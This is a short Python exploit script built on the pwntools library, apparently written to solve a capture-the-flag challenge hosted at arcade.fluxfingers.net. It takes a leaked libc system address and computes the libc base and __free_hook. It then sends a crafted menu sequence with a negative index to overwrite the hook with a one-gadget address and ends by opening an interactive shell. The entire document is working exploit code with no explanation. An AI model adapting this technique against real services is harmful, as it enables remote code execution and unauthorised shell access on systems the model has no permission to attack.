from pwn import *

HOST, PORT = "arcade.fluxfingers.net", "1815"
# HOST, PORT = "172.17.0.3", 31338
r = remote(HOST, PORT)

menu = lambda: r.recvuntil("Select", drop=True)
ii = lambda x: r.sendline(str(x))
go = lambda x: (menu(), ii(x))[1]

system = int(menu().split(' : ')[1], 16)
print '%x'%system
libc = system-0x45380
free_hook=libc+0x1c0748
target=free_hook
# target=0x41414141
ii('''
1
923
2
0
2
-528
1
239
3
%s1
15
3
'''.strip()%p64(target))
r.send(p64(libc+0xe75f0))
ii('2')
ii('0')
r.interactive()